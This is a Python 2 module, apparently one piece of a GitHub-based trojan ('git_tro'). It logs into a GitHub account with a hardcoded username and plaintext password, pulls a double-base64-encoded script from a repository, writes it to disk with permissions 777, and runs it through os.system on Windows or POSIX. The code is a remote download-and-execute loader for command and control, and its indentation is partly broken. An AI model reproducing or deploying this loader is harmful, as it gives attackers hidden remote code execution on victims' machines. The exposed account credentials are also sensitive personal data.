from github3 import login
import json
import base64
import os

scriptPath = "scripts/test.txt" #"modules/dirlister.py" #
folder = scriptPath.rstrip("test.txt")
bin = False
start = True
scriptExec = "python "
def connect_to_github():
	gh = login(username="MarvenGarsalli",password="1'mfor1am")
	repo = gh.repository("MarvenGarsalli","tro")
	branch = repo.branch("master")
	return gh,repo,branch

def get_file_contents(filepath):
	gh,repo,branch = connect_to_github()
	tree = branch.commit.commit.tree.to_tree().recurse()
	for filename in tree.tree:
		if filepath in filename.path:
			print("[OK] Found file %s" % filepath)
			blob = repo.blob(filename._json_data['sha']) #Hashed content
			return blob.content
	return None


def run(**args): # Must import its personal lib, git_tro will execute this module in # environment
	script	= get_file_contents(scriptPath)
	#content = None
	if script is not None:
		content	= base64.b64decode(base64.b64decode(script))
		print content
		try:
			os.makedirs(folder, mode=777)
		except:
			os.system("echo 'getRunScript: folder %s exists' >> Tapalog.log"%folder)
		if bin:
        	fich = open(scriptPath, "wb")
			fich.write(content)
			fich.close()
			if start and os.name == 'nt':
                  os.system("start {}".format(scriptPath))
          	elif start and os.name == 'posix':
                  os.system("chmod 777 {}".format(scriptPath))
                  os.system("./{}".format(scriptPath))
          	else:
                  os.system("echo 'Non-recognized OS' >> Tapalog.log")

        else:
            fich = open(scriptPath, "w")
			fich.write(content)
			fich.close()
			os.system(scriptExec+" "+scriptPath)
	else:
		#TODO: Customize log file path
		os.system("echo 'getRunScript: Unable to find file {}' >> Tapalog.log".format(scriptPath))
		return None
	return 

